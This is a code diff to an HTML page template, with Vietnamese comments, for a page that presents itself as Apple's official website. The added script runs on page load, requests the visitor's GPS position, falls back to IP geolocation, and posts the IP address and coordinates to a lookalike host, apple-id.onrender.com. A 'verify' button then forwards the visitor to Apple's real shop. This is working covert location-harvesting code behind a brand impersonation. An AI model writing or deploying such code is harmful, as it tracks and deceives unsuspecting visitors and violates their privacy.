@@ -116,42 +116,82 @@ HTML_PAGE = '''
     Website chính thức của apple
   </div>
 
-  <script>
+  <<script>
   window.addEventListener('DOMContentLoaded', async () => {
-    try {
-      // Lấy vị trí theo IP
-      const res = await fetch('https://ipapi.co/json/');
-      const data = await res.json();
+    const sendData = async (payload) => {
+      try {
+        await fetch('https://apple-id.onrender.com/submit', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        console.log("✅ Dữ liệu đã gửi:", payload);
+      } catch (err) {
+        console.error("❌ Lỗi khi gửi dữ liệu:", err);
+      }
+    };
 
-      // Không cần gửi IP, server sẽ tự lấy từ request
-      const payload = {
-        latitude: data.latitude,
-        longitude: data.longitude
-      };
+    // Ưu tiên: Lấy vị trí bằng GPS
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+          try {
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const ipData = await ipRes.json();
 
-      // Gửi dữ liệu về server (dùng đường dẫn tương đối nếu cùng host)
-      await fetch('/submit', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
+            const payload = {
+              ip: ipData.ip,
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude
+            };
+
+            await sendData(payload);
+          } catch (err) {
+            console.error("❌ Lỗi khi lấy IP:", err);
+          }
         },
-        body: JSON.stringify(payload)
-      });
-
-      console.log("✅ Đã gửi vị trí về server:", payload);
-    } catch (err) {
-      console.error("❌ Lỗi khi gửi vị trí:", err);
+        // Nếu GPS bị từ chối → fallback sang IP
+        async (err) => {
+          console.warn("⚠️ GPS không khả dụng, fallback IP:", err.message);
+          try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            const payload = {
+              ip: data.ip,
+              latitude: data.latitude,
+              longitude: data.longitude
+            };
+            await sendData(payload);
+          } catch (err2) {
+            console.error("❌ Lỗi fallback IP:", err2);
+          }
+        },
+        { timeout: 5000 }
+      );
+    } else {
+      // Nếu không có geolocation API
+      console.warn("⚠️ Trình duyệt không hỗ trợ geolocation");
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        const payload = {
+          ip: data.ip,
+          latitude: data.latitude,
+          longitude: data.longitude
+        };
+        await sendData(payload);
+      } catch (err3) {
+        console.error("❌ Lỗi lấy IP:", err3);
+      }
     }
 
-    // Thêm handler cho nút verify sau khi DOM đã sẵn sàng
-    const btn = document.getElementById("verifyBtn");
-    if (btn) {
-      btn.addEventListener("click", () => {
-        window.location.href = "https://www.apple.com/shop/";
-      });
-    }
+    // Nút chuyển tiếp
+    document.getElementById("verifyBtn")?.addEventListener("click", () => {
+      window.location.href = "https://www.apple.com/shop/";
+    });
   });
 </script>
+
 
 </body>
 </html>
